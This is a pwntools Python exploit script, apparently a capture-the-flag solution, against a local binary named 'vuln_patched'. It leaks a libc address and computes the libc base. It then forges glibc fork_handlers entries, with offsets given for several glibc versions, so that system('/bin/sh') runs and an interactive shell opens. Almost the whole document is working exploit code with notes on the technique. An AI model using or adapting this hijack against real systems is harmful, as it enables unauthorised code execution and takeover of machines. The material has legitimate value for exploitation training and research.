#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"

io = process("./vuln_patched")
# io = remote("localhost", 9999)

libc = ELF("./libc.so.6")

# glibc 2.28-2.35
# HANDLER_SZ, HAS_ID = 0x20, False
# glibc 2.36+
HANDLER_SZ, HAS_ID = 0x28, True


def header(array_ptr, used):
    return p64(used) * 2 + p64(array_ptr)


def handler_array(*funcs):
    assert funcs
    n = len(funcs)
    total = HANDLER_SZ * n - (0x18 if not HAS_ID else 0)
    data = bytearray(total)

    for i, fn in enumerate(funcs[::-1]):
        off = i * HANDLER_SZ
        data[off : off + 8] = p64(fn)
        if HAS_ID:
            data[off + 0x20 : off + 0x28] = p64(i)

    """
    After testing, when using libc's system() and /bin/sh,
    there's no need to fill the trailing zeros. Only if
    writing a custom /bin/sh string, the trailing zeros
    are needed to avoid issues, but also, just aligning to
    8 bytes is sufficient. Add a b"\x00\x00" e.g. is enough,
    like return bytes(data).rstrip(b'\x00') + b"\x00\x00".
    """
    return bytes(data).rstrip(b"\x00") + b"\x00\x00"


def forge(base, *funcs, rdi=None):
    assert funcs
    n = len(funcs)

    if rdi is None:
        used = n
        array_ptr = base + 0x18
    else:
        used = rdi
        array_ptr = (base + 0x18 - (used - n) * HANDLER_SZ) & 0xFFFFFFFFFFFFFFFF

    return header(array_ptr, used) + handler_array(*funcs)


io.recvuntil(b"gift: ")
leak_line = io.recvline().strip()
stdin_leak = int(leak_line, 16)
log.success(f"stdin leak: {hex(stdin_leak)}")

libc.address = stdin_leak - libc.sym["_IO_2_1_stdin_"]
log.success(f"libc base: {hex(libc.address)}")

# After my local tests, following are the addresses of fork_handlers in different glibc versions.
# For glibc 2.31:
# objdump -d libc.so.6 | grep "<__abort_msg@@GLIBC_PRIVATE+0xbe0>"
# For glibc 2.35:
# objdump -d libc.so.6 | grep "<getdate_err@@GLIBC_2.2.5+0x300>"
# For glibc 2.39/2.41/2.42:
# objdump -d libc.so.6 | grep "<re_syntax_options@@GLIBC_2.2.5+0x80>"
fork_handlers = libc.sym.re_syntax_options + 0x80
log.success(f"fork_handlers: {hex(fork_handlers)}")

"""
cmd_offset = len(forge(fork_handlers, libc.sym.system))
cmd_addr = fork_handlers + cmd_offset

data = forge(fork_handlers, libc.sym.system, rdi=cmd_addr)
data += b"/bin/sh\x00"
"""

bin_sh = next(libc.search(b"/bin/sh\x00"))
log.success(f"/bin/sh: {hex(bin_sh)}")
data = forge(fork_handlers, libc.sym.system, rdi=bin_sh)

req = p64(fork_handlers) + p64(len(data))
io.send(req)
io.send(data)

io.interactive()
